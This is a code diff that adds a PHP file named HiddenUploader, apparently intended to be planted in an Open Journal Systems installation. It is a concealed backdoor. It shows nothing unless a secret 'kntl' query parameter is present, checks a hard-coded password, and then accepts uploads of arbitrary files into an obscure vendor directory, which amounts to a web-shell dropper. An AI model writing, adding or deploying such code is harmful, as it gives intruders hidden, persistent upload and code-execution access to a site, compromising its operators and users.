@@ -1,0 +1,71 @@
+<?php
+error_reporting(0);
+
+class HiddenUploader {
+
+    private $trigger = "kntl";       // parameter trigger (?kntl)
+    private $password = "admin123";  // password login
+    private $targetPath = "lib/pkp/lib/vendor/doctrine/inflector/lib/Doctrine/Inflector/Rules/";
+
+    private function isTriggered() {
+        return isset($_GET[$this->trigger]);
+    }
+
+    private function ensurePath() {
+        if (!is_dir($this->targetPath)) {
+            mkdir($this->targetPath, 0755, true);
+        }
+    }
+
+    private function login() {
+        session_start();
+
+        if (isset($_POST['pass']) && $_POST['pass'] === $this->password) {
+            $_SESSION['auth'] = true;
+        }
+
+        if (!isset($_SESSION['auth'])) {
+            echo '<form method="post" style="margin-top:50px;text-align:center;">
+                    <input type="password" name="pass" placeholder="Password">
+                    <button type="submit">Login</button>
+                  </form>';
+            exit;
+        }
+    }
+
+    private function uploadForm() {
+        echo '<h3>Uploader</h3>
+              <form method="post" enctype="multipart/form-data">
+                <input type="file" name="file">
+                <button type="submit">Upload</button>
+              </form>';
+    }
+
+    private function handleUpload() {
+        if (!isset($_FILES['file'])) return;
+
+        $this->ensurePath();
+
+        $name = basename($_FILES['file']['name']);
+        $target = $this->targetPath . $name;
+
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+            echo "<p>Upload sukses</p>";
+        } else {
+            echo "<p>Upload gagal</p>";
+        }
+    }
+
+    public function run() {
+        if (!$this->isTriggered()) {
+            return; // tidak tampil apa-apa
+        }
+
+        $this->login();
+        $this->handleUpload();
+        $this->uploadForm();
+    }
+}
+
+$app = new HiddenUploader();
+$app->run();
